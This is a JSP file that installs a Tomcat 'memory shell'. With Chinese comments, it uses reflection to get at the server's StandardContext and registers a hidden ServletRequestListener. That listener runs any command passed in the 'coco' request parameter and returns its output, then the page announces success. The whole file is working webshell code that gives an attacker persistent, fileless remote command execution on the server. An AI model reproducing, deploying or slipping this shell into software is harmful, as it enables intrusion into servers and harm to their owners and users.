<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.util.Objects" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
        try {
            //获取ApplicationContextFade对象，ApplicationContextFade是ServletContext的实现，所以其实是ServletContext对象
            ServletContext servletContext = request.getSession().getServletContext();
            Field appctx = null;
            appctx = servletContext.getClass().getDeclaredField("context"); //从ApplicationContextFade获取context，这里context是指ApplicationContext

            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); //获取ApplicationContext

            Field standCtx = applicationContext.getClass().getDeclaredField("context");
            standCtx.setAccessible(true);
            StandardContext standardContext = (StandardContext) standCtx.get(applicationContext);

            ServletRequestListener listener =  new ServletRequestListener() {
                @Override
                public void requestDestroyed(ServletRequestEvent servletRequestEvent) throws RuntimeException {
                    try {
                        RequestFacade req = (RequestFacade) servletRequestEvent.getServletRequest();
                        Field requestField = null;

                        requestField = req.getClass().getDeclaredField("request");

                        requestField.setAccessible(true);
                        Request request = null;
                        request = (Request) requestField.get(req);
                        Response resp = request.getResponse();
//                        if ("/index.jsp".equals(request.getRequestURI())){
//                            resp.getWriter().write("hello index");
//                        }
                        if (request.getParameter("coco") != null) {
                            InputStream in = null;
                            try {
                                in = Runtime.getRuntime().exec(request.getParameter("coco")).getInputStream();
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }

                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";
                            resp.getWriter().write(output);
                            return;
                        }

                    } catch (Exception e){
                        e.printStackTrace();
                    }
                }

                @Override
                public void requestInitialized(ServletRequestEvent servletRequestEvent){
                    }

            };

            standardContext.addApplicationEventListener(listener);
            out.print("Add ServletRequestListener Memory Shell Success!");

        } catch (Exception e) {
                e.printStackTrace();
            }
%>